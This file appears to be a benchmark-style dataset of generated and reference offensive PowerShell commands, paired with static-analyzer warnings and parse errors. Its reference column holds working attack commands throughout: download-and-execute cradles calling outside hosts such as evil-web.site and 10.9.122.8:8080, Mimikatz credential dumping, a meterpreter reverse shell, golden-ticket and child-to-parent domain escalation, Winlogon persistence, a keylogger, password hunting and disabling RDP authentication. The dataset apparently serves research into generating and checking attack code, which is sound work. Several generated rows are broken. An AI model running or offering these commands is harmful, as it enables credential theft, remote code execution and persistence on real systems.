Invoke-Expression (Invoke-WebRequest -Uri 'YourScriptURL').Content,Invoke-Expression (Invoke-WebRequest -Uri 'YourScriptURL').Content,"$payload = 'IEX (New-Object Net.WebClient).DownloadString(""http://somesurl.com/juve.ps1"")'; Invoke-Expression $payload",['PSAvoidUsingInvokeExpression '],['Invoke-Expression is used. Please remove Invoke-Expression from script and find other options instead. '],['Warning'],['PSAvoidUsingInvokeExpression '],['Invoke-Expression is used. Please remove Invoke-Expression from script and find other options instead. '],['Warning']
Get-WmiObject -Class Win32_UserAccount,Get-WmiObject -Class Win32_UserAccount,Get-WmiObject -Class Win32_UserAccount,['PSAvoidUsingWMICmdlet '],"[""File 'buffer.ps1' uses WMI cmdlet. For PowerShell 3.0 and above, use CIM cmdlet which perform the same tasks as the WMI cmdlets. The CIM cmdlets comply with WS-Management (WSMan) standards and with the Common Information Model (CIM) standard, which enables the cmdlets to use the same techniques to manage Windows computers and those running other operating systems. ""]",['Warning'],['PSAvoidUsingWMICmdlet '],"[""File 'buffer.ps1' uses WMI cmdlet. For PowerShell 3.0 and above, use CIM cmdlet which perform the same tasks as the WMI cmdlets. The CIM cmdlets comply with WS-Management (WSMan) standards and with the Common Information Model (CIM) standard, which enables the cmdlets to use the same techniques to manage Windows computers and those running other operating systems. ""]",['Warning']
"Invoke-Mimikatz -Command ""YourMimikatzCommand""; Invoke-Shellcode -Shellcode ""YourShellcode"" -Parameters ""YourParameters""","Invoke-Mimikatz -Command ""YourMimikatzCommand""; Invoke-Shellcode -Shellcode ""YourShellcode"" -Parameters ""YourParameters""",Invoke-Mimikatz -DumpCreds; Invoke-Shellcode -Payload windows/meterpreter/reverse_tcp -Lhost 10.0.0.1 -Lport 443; Invoke-C,[''],[''],[''],[''],[''],['']
"Get-IndexedItems -Filter ""Stingray"" -Kind ""picture"" -Keywords ""portfolio""","Get-IndexedItems -Filter ""Stingray"" -Kind ""picture"" -Keywords ""portfolio""","Get-IndexedItem -Filter Contains(*,'Stingray'), kind = 'picture', keywords='portfolio'",[''],[''],[''],['MissingArgument '],['Missing argument in parameter list. '],['ParseError']
"$ErrorActionPreference = ""YourErrorActionPreference""; $VerbosePreference = ""YourVerbosePreference""; $DebugPreference = ""YourDebugPreference""; & { YourCommand }","$ErrorActionPreference = ""YourErrorActionPreference""; $VerbosePreference = ""YourVerbosePreference""; $DebugPreference = ""YourDebugPreference""; & { YourCommand }",$ScriptBlockLoggingPreference='SilentlyContinue'; $ErrorActionPreference='SilentlyContinue'; $VerbosePreference='SilentlyContinue'; Invoke-SomeCmdlet -Parameter1 Value1 -Parameter2 Value2,[''],[''],[''],['PSUseDeclaredVarsMoreThanAssignments '],"[""The variable 'ScriptBlockLoggingPreference' is assigned but never used. ""]",['Warning']
"Invoke-Shellcode -Shellcode ""YourShellcode""","Invoke-Shellcode -Shellcode ""YourShellcode""","Invoke-Shellcode -Shellcode @(0xE9,0x90,0x83)",[''],[''],[''],[''],[''],['']
"powershell.exe -Option1 ""YourOption1"" -Option2 ""YourOption2"" -Command ""& { IEX (Invoke-WebRequest -Uri 'YourScriptURL').Content }""","powershell.exe -Option1 ""YourOption1"" -Option2 ""YourOption2"" -Command ""& { IEX (Invoke-WebRequest -Uri 'YourScriptURL').Content }""",powershell.exe -NoP -NonI -W Hidden -Exec Bypass  IEX (New-Object Net.WebClient).DownloadString('http://site.com/code'),[''],[''],[''],[''],[''],['']
"mshta.exe ""C:\Path\To\Your\HTMLApplication.hta""","mshta.exe ""C:\Path\To\Your\HTMLApplication.hta""",Invoke-ATHHTMLApplication -ScriptEngine ${script_engine} -InlineProtocolHandler ${protocol_handler} -UseRundll32 -Rundll32FilePath ${rundll32_file_path},[''],[''],[''],[''],[''],['']
"Invoke-Command -FilePath 'C:\Path\To\Script.ps1' -ArgumentList 'param1', 'param2' -InputObject (Get-Content 'C:\Path\To\Payload.xml' | Out-String)","Invoke-Command -FilePath 'C:\Path\To\Script.ps1' -ArgumentList 'param1', 'param2' -InputObject (Get-Content 'C:\Path\To\Payload.xml' | Out-String)","${mwcpath}\${mwcname} ""${xml_payload}"" output.txt",[''],[''],[''],['UnexpectedToken '],"[""Unexpected token '\\${mwcname}' in expression or statement. ""]",['ParseError']
Invoke-WebRequest -Uri 'http://example.com/script.ps1' -OutFile 'C:\Path\To\Script.ps1'; Invoke-Expression 'C:\Path\To\Script.ps1',Invoke-WebRequest -Uri 'http://example.com/script.ps1' -OutFile 'C:\Path\To\Script.ps1'; Invoke-Expression 'C:\Path\To\Script.ps1',"powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -WindowStyle Hidden -Command ""IEX (Invoke-WebRequest -Uri 'http://HeavySite.com/script.ps1').Content""",['PSAvoidUsingInvokeExpression '],['Invoke-Expression is used. Please remove Invoke-Expression from script and find other options instead. '],['Warning'],[''],[''],['']
Invoke-Command -ComputerName 'RemoteComputer' -ScriptBlock { Get-WmiObject Win32_Share },Invoke-Command -ComputerName 'RemoteComputer' -ScriptBlock { Get-WmiObject Win32_Share },net view \\${remote.host.fqdn} /all,"['PSAvoidUsingWMICmdlet ', ' PSAvoidUsingComputerNameHardcoded ']","[""File 'buffer.ps1' uses WMI cmdlet. For PowerShell 3.0 and above, use CIM cmdlet which perform the same tasks as the WMI cmdlets. The CIM cmdlets comply with WS-Management (WSMan) standards and with the Common Information Model (CIM) standard, which enables the cmdlets to use the same techniques to manage Windows computers and those running other operating systems. "", "" The ComputerName parameter of cmdlet 'Invoke-Command' is hardcoded. This will expose sensitive information about the system if the script is shared. ""]","['Warning ', ' Error']",[''],[''],['']
Set-ItemProperty -Path 'HKLM:\Software\Microsoft\Windows\CurrentVersion\Winlogon' -Name 'PropertyName' -Value 'PropertyValue',Set-ItemProperty -Path 'HKLM:\Software\Microsoft\Windows\CurrentVersion\Winlogon' -Name 'PropertyName' -Value 'PropertyValue',"Set-ItemProperty ""HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\"" ""Shell"" ""explorer.exe, ${binaryToExec}"" -Force",[''],[''],[''],['PSAvoidUsingPositionalParameters '],"[""Cmdlet 'Set-ItemProperty' has positional parameter. Please use named parameters instead of positional parameters when calling a command. ""]",['Information']
Invoke-Command -ComputerName 'TargetComputer' -ScriptBlock { Invoke-Expression (Invoke-WebRequest -Uri 'http://example.com/script.ps1').Content },Invoke-Command -ComputerName 'TargetComputer' -ScriptBlock { Invoke-Expression (Invoke-WebRequest -Uri 'http://example.com/script.ps1').Content },Invoke-Command -ComputerName <target> -ScriptBlock { Invoke-Expression (New-Object Net.WebClient).DownloadString('http://evil-web.site/superbad.ps1') },"['PSAvoidUsingInvokeExpression ', ' PSAvoidUsingComputerNameHardcoded ']","['Invoke-Expression is used. Please remove Invoke-Expression from script and find other options instead. ', "" The ComputerName parameter of cmdlet 'Invoke-Command' is hardcoded. This will expose sensitive information about the system if the script is shared. ""]","['Warning ', ' Error']","['RedirectionNotSupported ', ' PSAvoidUsingInvokeExpression ']","[""The '<' operator is reserved for future use. "", ' Invoke-Expression is used. Please remove Invoke-Expression from script and find other options instead. ']","['ParseError ', ' Warning']"
Get-ChildItem -Path .,Get-ChildItem -Path .,dir,[''],[''],[''],['PSAvoidUsingCmdletAliases '],"[""'dir' is an alias of 'Get-ChildItem'. Alias can introduce possible problems and make scripts hard to maintain. Please consider changing alias to its full content. ""]",['Warning']
$cert = Import-Certificate -FilePath 'C:\Path\To\Certificate.cer'; Move-Item -Path $cert.PSPath -Destination 'Cert:\LocalMachine\Root',$cert = Import-Certificate -FilePath 'C:\Path\To\Certificate.cer'; Move-Item -Path $cert.PSPath -Destination 'Cert:\LocalMachine\Root',"$cert = Import-Certificate -FilePath ${pfx_path} -CertStoreLocation Cert:\LocalMachine\My ; Move-Item -Path $cert.PSPath -Destination ""Cert:\LocalMachine\Root""",[''],[''],[''],[''],[''],['']
"Get-WmiObject -Class Win32_Product | ForEach-Object { $_.InvokeMethod('MethodName', 'Argument1', 'Argument2') }","Get-WmiObject -Class Win32_Product | ForEach-Object { $_.InvokeMethod('MethodName', 'Argument1', 'Argument2') }",Invoke-CimMethod -ClassName Win32_Product -MethodName ${action} -Arguments @{ PackageLocation = '${msi_Payload}' },['PSAvoidUsingWMICmdlet '],"[""File 'buffer.ps1' uses WMI cmdlet. For PowerShell 3.0 and above, use CIM cmdlet which perform the same tasks as the WMI cmdlets. The CIM cmdlets comply with WS-Management (WSMan) standards and with the Common Information Model (CIM) standard, which enables the cmdlets to use the same techniques to manage Windows computers and those running other operating systems. ""]",['Warning'],[''],[''],['']
MSBuild 'C:\Path\To\ProjectFile.csproj',MSBuild 'C:\Path\To\ProjectFile.csproj',Invoke-ExecuteMSBuild,[''],[''],[''],[''],[''],['']
"$wininit = Get-Process -Name 'wininit'; $token = $wininit.Token; Start-Process -FilePath 'cmd.exe' -Credential (New-Object System.Management.Automation.PSCredential -ArgumentList 'Username', $token)","$wininit = Get-Process -Name 'wininit'; $token = $wininit.Token; Start-Process -FilePath 'cmd.exe' -Credential (New-Object System.Management.Automation.PSCredential -ArgumentList 'Username', $token)",Get-Process wininit | Invoke-TokenManipulation -CreateProcess 'cmd.exe',[''],[''],[''],[''],[''],['']
Get-NetDomain,Get-NetDomain,Get-Domain,[''],[''],[''],[''],[''],['']
"Invoke-Mimikatz -Command '\kerberos::golden /domain:child.domain /sid:ChildDomainSID /rc4:KrbtgtHash /user:Administrator /service:cifs /target:RootDomainSID\""'""","Invoke-Mimikatz -Command '\kerberos::golden /domain:child.domain /sid:ChildDomainSID /rc4:KrbtgtHash /user:Administrator /service:cifs /target:RootDomainSID\""'""",ticketer.py -nthash < krbtgt_hash> -domain < child_domain> -domain-sid < child_domain_sid> -extra-sid < root_domain_sid> Administrator,['TerminatorExpectedAtEndOfString '],"['The string is missing the terminator: "". ']",['ParseError'],"['RedirectionNotSupported ', ' RedirectionNotSupported ', ' RedirectionNotSupported ', ' RedirectionNotSupported ']","[""The '<' operator is reserved for future use. "", "" The '<' operator is reserved for future use. "", "" The '<' operator is reserved for future use. "", "" The '<' operator is reserved for future use. ""]","['ParseError ', ' ParseError ', ' ParseError ', ' ParseError']"
"Get-Item -Path 'HKCR:\','HKCU:\','HKLM:\','HKU:\','HKCC:\' -Recurse | Where-Object { $_.Name -like '*password*' -or $_.Value -like '*password*' }","Get-Item -Path 'HKCR:\','HKCU:\','HKLM:\','HKU:\','HKCC:\' -Recurse | Where-Object { $_.Name -like '*password*' -or $_.Value -like '*password*' }","$pattern = ""password"";$hives = ""HKEY_CLASSES_ROOT"",""HKEY_CURRENT_USER"",""HKEY_LOCAL_MACHINE"",""HKEY_USERS"",""HKEY_CURRENT_CONFIG"";foreach ($r in $hives) { gci ""registry::${r}\"" -rec -ea SilentlyContinue | sls ""$pattern"" };foreach ($r in $hives) { gci ""registry::${r}\"" -rec -ea SilentlyContinue | % { if((gp $_.PsPath -ea SilentlyContinue) -match ""$pattern"") { $_.PsPath; $_ | out-string -stream | sls ""$pattern"" }}}",[''],[''],[''],"['PSAvoidUsingCmdletAliases ', ' PSAvoidUsingCmdletAliases ', ' PSAvoidUsingCmdletAliases ', ' PSAvoidUsingCmdletAliases ', ' PSAvoidUsingCmdletAliases ', ' PSAvoidUsingCmdletAliases ']","[""'gci' is an alias of 'Get-ChildItem'. Alias can introduce possible problems and make scripts hard to maintain. Please consider changing alias to its full content. "", "" 'sls' is an alias of 'Select-String'. Alias can introduce possible problems and make scripts hard to maintain. Please consider changing alias to its full content. "", "" 'gci' is an alias of 'Get-ChildItem'. Alias can introduce possible problems and make scripts hard to maintain. Please consider changing alias to its full content. "", "" '%' is an alias of 'ForEach-Object'. Alias can introduce possible problems and make scripts hard to maintain. Please consider changing alias to its full content. "", "" 'gp' is an alias of 'Get-ItemProperty'. Alias can introduce possible problems and make scripts hard to maintain. Please consider changing alias to its full content. "", "" 'sls' is an alias of 'Select-String'. Alias can introduce possible problems and make scripts hard to maintain. Please consider changing alias to its full content. ""]","['Warning ', ' Warning ', ' Warning ', ' Warning ', ' Warning ', ' Warning']"
Get-PSSession,Get-PSSession,Enter-PSSession -ConfigurationName doublehopsess -ComputerName < pc_name> -Credential domain_name\username,[''],[''],[''],['RedirectionNotSupported '],"[""The '<' operator is reserved for future use. ""]",['ParseError']
[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('Base64EncodedString')),[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('Base64EncodedString')),$originalString = 'SensitiveCommand'; $obfuscatedString = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($originalString)); $decodedString = [System.Text.Encoding]::Unicode.GetString([Convert]::FromBase64String($obfuscatedString)); InvokeExpression $decodedString,[''],[''],[''],[''],[''],['']
. .\Get-PassHashes.ps1; Get-PassHashes -CommandType All,. .\Get-PassHashes.ps1; Get-PassHashes -CommandType All,"iex(iwr(""https://raw.githubusercontent.com/samratashok/nishang/master/Gather/Get-PassHashes.ps1""));Get-PassHashes",[''],[''],[''],"['PSAvoidUsingInvokeExpression ', ' PSAvoidUsingCmdletAliases ', ' PSAvoidUsingCmdletAliases ']","['Invoke-Expression is used. Please remove Invoke-Expression from script and find other options instead. ', "" 'iex' is an alias of 'Invoke-Expression'. Alias can introduce possible problems and make scripts hard to maintain. Please consider changing alias to its full content. "", "" 'iwr' is an alias of 'Invoke-WebRequest'. Alias can introduce possible problems and make scripts hard to maintain. Please consider changing alias to its full content. ""]","['Warning ', ' Warning ', ' Warning']"
Rename-Item -Path function:\OriginalFunction -NewName 'NewFunctionName',Rename-Item -Path function:\OriginalFunction -NewName 'NewFunctionName',Function MyGetProc { Get-Process }; MyGetProc,[''],[''],[''],[''],[''],['']
"Invoke-Mimikatz -Command '\kerberos::tgt /user:ChildDomainAdmin /domain:ChildDomain /rc4:ChildDomainKrbtgtHash\""'""","Invoke-Mimikatz -Command '\kerberos::tgt /user:ChildDomainAdmin /domain:ChildDomain /rc4:ChildDomainKrbtgtHash\""'""",Rubeus.exe asktgs /service:cifs/dc.doamin.external /domain:dc.domain.external /dc:dc.domain.external /ticket:doIFMT[...snip...]5BTA== /nowrap,['TerminatorExpectedAtEndOfString '],"['The string is missing the terminator: "". ']",['ParseError'],[''],[''],['']
Invoke-PrivilegeEscalation,Invoke-PrivilegeEscalation,"Invoke-SQLEscalatePriv -Verbose -Instance ""SQLServer1\Instance1""",[''],[''],[''],[''],[''],['']
Get-GPO -Domain 'DomainName' -OrganizationalUnit 'OUPath',Get-GPO -Domain 'DomainName' -OrganizationalUnit 'OUPath',Get-NetGPO -GPOName '{3E04167E-C2B6-4A9A-8FB7-C811158DC97C}',[''],[''],[''],[''],[''],['']
Start-Transcript -Path 'C:\Path\To\Keystrokes.txt',Start-Transcript -Path 'C:\Path\To\Keystrokes.txt',$path = 'C:\temp\keystrokes.txt'; Add-Type -AssemblyName System.Windows.Forms; $listener = New-Object System.Windows.Forms.Keylogger; [System.Windows.Forms.Application]::Run($listener); $listener.Keys | Out-File -FilePath $path,[''],[''],[''],[''],[''],['']
netsh interface portproxy add v4tov4 listenport=LocalPort listenaddress=LocalIPAddress connectport=RemotePort connectaddress=RemoteIPAddress,netsh interface portproxy add v4tov4 listenport=LocalPort listenaddress=LocalIPAddress connectport=RemotePort connectaddress=RemoteIPAddress,netsh interface portproxy add v4tov4 listenport=5446 listenaddress=10.35.8.17 connectport=5985 connectaddress=10.35.8.23,[''],[''],[''],[''],[''],['']
Get-ChildItem -Path 'C:\Path\To\ConfigFiles\' -Recurse | Select-String -Pattern 'password',Get-ChildItem -Path 'C:\Path\To\ConfigFiles\' -Recurse | Select-String -Pattern 'password',"gci c:\ -Include *.txt,*.xml,*.config,*.conf,*.cfg,*.ini -File -Recurse -EA SilentlyContinue | Select-String -Pattern ""password""",[''],[''],[''],['PSAvoidUsingCmdletAliases '],"[""'gci' is an alias of 'Get-ChildItem'. Alias can introduce possible problems and make scripts hard to maintain. Please consider changing alias to its full content. ""]",['Warning']
Get-WmiObject Win32_Share | Where-Object { $_.Type -eq 0 },Get-WmiObject Win32_Share | Where-Object { $_.Type -eq 0 },Find-DomainShare -CheckShareAccess,['PSAvoidUsingWMICmdlet '],"[""File 'buffer.ps1' uses WMI cmdlet. For PowerShell 3.0 and above, use CIM cmdlet which perform the same tasks as the WMI cmdlets. The CIM cmdlets comply with WS-Management (WSMan) standards and with the Common Information Model (CIM) standard, which enables the cmdlets to use the same techniques to manage Windows computers and those running other operating systems. ""]",['Warning'],[''],[''],['']
1..254 | ForEach-Object { [System.Net.Dns]::GetHostEntry('10.10.1.' + $_) } | Out-File 'ip_hostname.txt',1..254 | ForEach-Object { [System.Net.Dns]::GetHostEntry('10.10.1.' + $_) } | Out-File 'ip_hostname.txt',"$net = ""10.10.1."";0..255 | foreach {$r=(Resolve-DNSname -ErrorAction SilentlyContinue $net$_ | ft NameHost -HideTableHeaders | Out-String).trim().replace(""\s+"","""").replace(""`r"","""").replace(""`n"","" ""); Write-Output ""$net$_ $r""} | tee ip_hostname.txt",[''],[''],[''],"['PSAvoidUsingCmdletAliases ', ' PSAvoidUsingCmdletAliases ', ' PSAvoidUsingCmdletAliases ']","[""'foreach' is an alias of 'ForEach-Object'. Alias can introduce possible problems and make scripts hard to maintain. Please consider changing alias to its full content. "", "" 'ft' is an alias of 'Format-Table'. Alias can introduce possible problems and make scripts hard to maintain. Please consider changing alias to its full content. "", "" 'tee' is an alias of 'Tee-Object'. Alias can introduce possible problems and make scripts hard to maintain. Please consider changing alias to its full content. ""]","['Warning ', ' Warning ', ' Warning']"
python raiseChild.py -dc-ip 'DomainControllerIP' -u 'ChildAdminUser' -p 'ChildAdminPassword' -td 'ParentDomainSID' -tgst 'ChildDomainKRBTGTHash' -target 'ParentDomainController' -targetexec,python raiseChild.py -dc-ip 'DomainControllerIP' -u 'ChildAdminUser' -p 'ChildAdminPassword' -td 'ParentDomainSID' -tgst 'ChildDomainKRBTGTHash' -target 'ParentDomainController' -targetexec,raiseChild.py -target-exec 10.10.10.10 <child_domain>/username,[''],[''],[''],['RedirectionNotSupported '],"[""The '<' operator is reserved for future use. ""]",['ParseError']
New-SmbShare -Name 'GuestShare' -Path 'C:\Path\To\SharedFolder' -ReadAccess 'Everyone',New-SmbShare -Name 'GuestShare' -Path 'C:\Path\To\SharedFolder' -ReadAccess 'Everyone',"new-item ""c:\users\public\share"" -itemtype directory;New-SmbShare -Name ""sharedir"" -Path ""C:\users\public\share"" -FullAccess ""Everyone"",""Guests"",""Anonymous Logon""",[''],[''],[''],[''],[''],['']
Add-Content -Path 'C:\Path\To\File.txt' -Value 'MaliciousData' -Stream '::$DATA',Add-Content -Path 'C:\Path\To\File.txt' -Value 'MaliciousData' -Stream '::$DATA',$content = 'Invoke-Mimikatz'; $file = 'C:\temp\normal.txt'; $stream = 'C:\temp\normal.txt:hidden'; SetContent -Path $file -Value 'This is a normal file'; Add-Content -Path $stream -Value $content; GetContent -Path $stream,[''],[''],[''],[''],[''],['']
whoami /user,whoami /user,([System.Security.Principal.WindowsIdentity]::GetCurrent()).User.Value,[''],[''],[''],[''],[''],['']
[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('Base64EncodedPath')),[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('Base64EncodedPath')),$path = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('QzpcVGVtcFxBZG1pblRvb2xz')); Invoke-Item $path,[''],[''],[''],[''],[''],['']
Invoke-Expression (New-Object Net.WebClient).DownloadString('http://example.com/script.ps1'),Invoke-Expression (New-Object Net.WebClient).DownloadString('http://example.com/script.ps1'),$code = [System.IO.File]::ReadAllText('C:\temp\script.ps1'); Invoke-Expression $code,['PSAvoidUsingInvokeExpression '],['Invoke-Expression is used. Please remove Invoke-Expression from script and find other options instead. '],['Warning'],['PSAvoidUsingInvokeExpression '],['Invoke-Expression is used. Please remove Invoke-Expression from script and find other options instead. '],['Warning']
Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp' -Name 'UserAuthentication' -Value 0,Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp' -Name 'UserAuthentication' -Value 0,"(Get-WmiObject -class ""Win32_TSGeneralSetting"" -Namespace root\cimv2\terminalservices -Filter ""TerminalName='RDP-tcp'"").SetUserAuthenticationRequired(0)",[''],[''],[''],['PSAvoidUsingWMICmdlet '],"[""File 'buffer.ps1' uses WMI cmdlet. For PowerShell 3.0 and above, use CIM cmdlet which perform the same tasks as the WMI cmdlets. The CIM cmdlets comply with WS-Management (WSMan) standards and with the Common Information Model (CIM) standard, which enables the cmdlets to use the same techniques to manage Windows computers and those running other operating systems. ""]",['Warning']
Get-ADForest,Get-ADForest,Get-ForestGlobalCatalog,[''],[''],[''],[''],[''],['']
"Add-Type @"" using System; using System.Runtime.InteropServices; public class Keylogger { [DllImport('user32.dll', SetLastError = true)] public static extern short GetAsyncKeyState(int vKey); } ""@; while ($true) { Start-Sleep -Milliseconds 10; for ($i=1; $i -le 255; $i++) { $keyState = [Keylogger]::GetAsyncKeyState($i); if ($keyState -eq -32767) { Add-Content -Path 'C:\Path\To\Keylog.txt' -Value [char]$i } } }","Add-Type @"" using System; using System.Runtime.InteropServices; public class Keylogger { [DllImport('user32.dll', SetLastError = true)] public static extern short GetAsyncKeyState(int vKey); } ""@; while ($true) { Start-Sleep -Milliseconds 10; for ($i=1; $i -le 255; $i++) { $keyState = [Keylogger]::GetAsyncKeyState($i); if ($keyState -eq -32767) { Add-Content -Path 'C:\Path\To\Keylog.txt' -Value [char]$i } } }","Add-Type -TypeDefinition @"" using System; using System.Runtime.InteropServices; public class KeyLogger { [DllImport(""user32.dll"")] public static extern int GetAsyncKeyState(Int32 i); } ""@ while ($true) { Start-Sleep -Milliseconds 100 for ($i = 8; $i -le 190; $i++) { if ([KeyLogger]::GetAsyncKeyState($i) eq -32767) { $Key = [System.Enum]::GetName([System.Windows.Forms.Keys], $i) Write-Host $Key } } }",['UnexpectedCharactersAfterHereStringHeader '],['No characters are allowed after a here-string header but before the end of the line. '],['ParseError'],"['UnexpectedCharactersAfterHereStringHeader ', ' MissingEndParenthesisInExpression ', ' MissingEndCurlyBrace ', ' UnexpectedToken ', ' UnexpectedToken ', ' MissingEndParenthesisAfterStatement ', ' MissingEndCurlyBrace ', ' UnexpectedToken ', ' UnexpectedToken ', ' UnexpectedToken ', ' UnexpectedToken ', ' PSAvoidUsingPositionalParameters ']","['No characters are allowed after a here-string header but before the end of the line. ', "" Missing closing ')' in expression. "", "" Missing closing '}' in statement block or type definition. "", "" Unexpected token ')' in expression or statement. "", "" Unexpected token 'eq' in expression or statement. "", "" Missing closing ')' after expression in 'if' statement. "", "" Missing closing '}' in statement block or type definition. "", "" Unexpected token ')' in expression or statement. "", "" Unexpected token 'Write-Host' in expression or statement. "", "" Unexpected token '}' in expression or statement. "", "" Unexpected token '}' in expression or statement. "", "" Cmdlet 'Add-Type' has positional parameter. Please use named parameters instead of positional parameters when calling a command. ""]","['ParseError ', ' ParseError ', ' ParseError ', ' ParseError ', ' ParseError ', ' ParseError ', ' ParseError ', ' ParseError ', ' ParseError ', ' ParseError ', ' ParseError ', ' Information']"
"Add-Type @"" public class MaliciousCode { public static void Execute() { // Malicious code goes here } } ""@; [MaliciousCode]::Execute()","Add-Type @"" public class MaliciousCode { public static void Execute() { // Malicious code goes here } } ""@; [MaliciousCode]::Execute()","Add-Type -TypeDefinition 'using System; public class MyClass { public static void Run() { Console.WriteLine(""Executed""); } }'; [MyClass]::Run()",['UnexpectedCharactersAfterHereStringHeader '],['No characters are allowed after a here-string header but before the end of the line. '],['ParseError'],[''],[''],['']
Invoke-Expression (New-Object Net.WebClient).DownloadString('http://10.9.122.8:8080/AZPLhG9txdFhS9n'),Invoke-Expression (New-Object Net.WebClient).DownloadString('http://10.9.122.8:8080/AZPLhG9txdFhS9n'),powershell.exe -nop -w hidden -c $k=new-object net.webclient;$k.proxy=[Net.WebRequest]::GetSystemWebProxy();$k.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;IEX $k.downloadstring('http://10.9.122.8:8080/AZPLhG9txdFhS9n');,['PSAvoidUsingInvokeExpression '],['Invoke-Expression is used. Please remove Invoke-Expression from script and find other options instead. '],['Warning'],"['PSAvoidUsingInvokeExpression ', ' PSAvoidUsingCmdletAliases ']","['Invoke-Expression is used. Please remove Invoke-Expression from script and find other options instead. ', "" 'IEX' is an alias of 'Invoke-Expression'. Alias can introduce possible problems and make scripts hard to maintain. Please consider changing alias to its full content. ""]","['Warning ', ' Warning']"
New-NetFirewallRule -DisplayName 'Allow RDP' -Direction Inbound -Protocol TCP -LocalPort 3389 -Action Allow,New-NetFirewallRule -DisplayName 'Allow RDP' -Direction Inbound -Protocol TCP -LocalPort 3389 -Action Allow,"Get-NetFirewallRule -DisplayGroup ""Remote Desktop"" | Set-NetFirewallRule -Enabled True",[''],[''],[''],[''],[''],['']
"Get-Command -Name 'Get-DbaDatabase' | Select-Object -Property Source, Definition","Get-Command -Name 'Get-DbaDatabase' | Select-Object -Property Source, Definition","Get-SQLInstanceDomain | Get-SQLConnectionTest | ? { $_ . Status -eq ""Accessible"" } | Get-SQLServerInfo",[''],[''],[''],"['UnexpectedToken ', ' PSAvoidUsingCmdletAliases ']","[""Unexpected token '.' in expression or statement. "", "" '?' is an alias of 'Where-Object'. Alias can introduce possible problems and make scripts hard to maintain. Please consider changing alias to its full content. ""]","['ParseError ', ' Warning']"
